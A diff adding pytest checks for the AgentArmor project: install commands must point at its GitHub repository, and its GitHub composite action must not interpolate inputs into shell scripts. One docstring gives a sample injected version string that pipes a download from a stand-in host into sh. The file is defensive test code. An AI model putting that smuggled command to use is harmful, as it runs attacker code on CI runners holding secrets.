@@ -100,3 +100,69 @@ def test_the_stale_release_body_is_gone():
     generated from the changelog now, so the file must not come back.
     """
     assert not (REPO / "docs" / "RELEASE_BODY.md").exists()
+
+
+def test_the_docs_do_not_tell_users_to_install_an_unrelated_package():
+    """The `agentarmor` name on PyPI belongs to a different project.
+
+    `pip install agentarmor` fetches `ankitlade12/AgentArmor`, so a user following
+    our own README ends up with someone else's package and no `agentarmor` command.
+    Every documented install must therefore name this repository.
+    """
+    for relative in ("README.md", "docs/MAC.md", "scripts/changelog_section.py"):
+        path = REPO / relative
+        if not path.exists():
+            continue
+        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
+            stripped = line.strip()
+            # Only actual commands. Prose may name the PyPI package - the note
+            # explaining why not to install it has to mention it.
+            if not stripped.startswith("pip install"):
+                continue
+            if "agentarmor" not in stripped:
+                continue
+            if stripped.startswith("pip install -e") or "maturin" in stripped:
+                continue  # developer checkout, already this repository
+            assert "git+" in line and "YashvantHange/AgentArmor" in line, (
+                f"{relative}:{number} installs from PyPI, which is a different "
+                f"project: {line.strip()!r}"
+            )
+
+
+def test_the_github_action_installs_from_this_repository():
+    """Not from PyPI, where the name belongs to a different project.
+
+    Asserts the property rather than one spelling: the repository URL now arrives
+    through env, so the literal "git+https://github.com/..." no longer appears as a
+    single run: string.
+    """
+    text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
+    assert "github.com/YashvantHange/AgentArmor" in text
+    assert "git+" in text
+    assert 'pip install "agentarmor==' not in text
+    assert "pip install agentarmor==" not in text
+
+
+def test_the_action_never_interpolates_inputs_into_a_shell_script():
+    """A composite action runs in the caller's runner, with the caller's secrets.
+
+    GitHub substitutes ${{ }} into the script text before bash sees it, so an input
+    like  1.0.0"; curl evil.sh | sh; echo "  becomes shell code. That makes it a
+    supply-chain problem for every repository using the action, not a local bug.
+    Inputs must reach the shell through env instead.
+    """
+    import yaml
+
+    action = yaml.safe_load((REPO / "action" / "action.yml").read_text(encoding="utf-8"))
+    offenders = [
+        step.get("name")
+        for step in action["runs"]["steps"]
+        if "${{" in (step.get("run") or "")
+    ]
+    assert not offenders, f"these steps interpolate an expression into a script: {offenders}"
+
+
+def test_the_action_validates_the_version_before_using_it_as_a_git_ref():
+    """Unvalidated, the version input could name any ref in the repository."""
+    text = (REPO / "action" / "action.yml").read_text(encoding="utf-8")
+    assert "[0-9]+\.[0-9]+\.[0-9]+" in text, "no semver check on the version input"
